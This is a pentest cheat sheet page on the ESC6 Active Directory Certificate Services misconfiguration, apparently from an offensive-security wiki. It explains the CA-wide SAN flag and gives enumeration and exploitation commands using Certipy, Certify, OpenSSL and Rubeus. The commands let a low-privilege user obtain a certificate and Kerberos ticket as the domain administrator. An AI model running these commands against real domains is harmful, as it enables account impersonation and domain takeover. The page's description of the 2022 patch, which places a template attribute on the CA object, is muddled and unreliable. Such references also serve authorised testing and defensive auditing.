# ESC6

{% hint style="info" %}
EDITF\_ATTRIBUTESUBJECTALTNAME2 setting on CA - Request certs for ANY user
{% endhint %}

## Why It Works

* `EDITF_ATTRIBUTESUBJECTALTNAME2` is a **CA-wide** policy flag (not per-template). When set, the CA honors a custom SAN supplied in the request's _attributes_ (`-attrib "SAN:..."`), regardless of whether the specific template has `ENROLLEE_SUPPLIES_SUBJECT` set.
* This effectively turns **every single enabled template on that CA** into an ESC1-vulnerable template - even ones that would otherwise be perfectly safe.
* If the CA has this flag set and any template permits Client Authentication with enrollment rights for a low-priv principal, the attacker can request a cert from that "safe" template but supply an arbitrary SAN (e.g. `administrator@domain.com`) as a request attribute, and the CA will still embed it.
* Since Microsoft's May 2022 patches (KB5014754), an additional `msPKI-Enrollment-Flag` control on the CA object was added to compensate, but many CAs remain misconfigured because the flag pre-dates the patch and wasn't proactively remediated.

## Prerequisites

* `EDITF_ATTRIBUTESUBJECTALTNAME2` bit set in the CA's `ConfigString` policy flags (check via `certutil -config <CA> -getreg policy\\EditFlags`).
* At least one enabled template with Client Auth EKU and enrollment rights for a low-priv principal (does **not** need `ENROLLEE_SUPPLIES_SUBJECT`).

## Enumerate

{% code lineNumbers="true" %}
```bash
certipy find -u <user>@<domain> -p <password> -dc-ip <DC-IP> -vulnerable -stdout
## Flags CAs where 'User Specified SAN' = 'Enabled' at the CA level
```
{% endcode %}

## Exploit

{% tabs %}
{% tab title="Certipy" %}
{% code lineNumbers="true" %}
```bash
certipy req -u <user>@<domain> -p <password> -ca <CA-Name> -template <any-client-auth-template> -upn administrator@<domain>
certipy auth -pfx administrator.pfx -dc-ip <DC-IP>
```
{% endcode %}
{% endtab %}

{% tab title="Certify + Rubeus + Openssl" %}
{% code lineNumbers="true" %}
```bat
Certify.exe request /ca:<CA-ServerDomain>\<CA-Username> /template:<any-client-auth-template> /altname:administrator
openssl.exe pkcs12 -in esc6.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out esc6.pfx
Rubeus.exe asktgt /user:administrator /certificate:esc6.pfx /ptt
```
{% endcode %}
{% endtab %}
{% endtabs %}
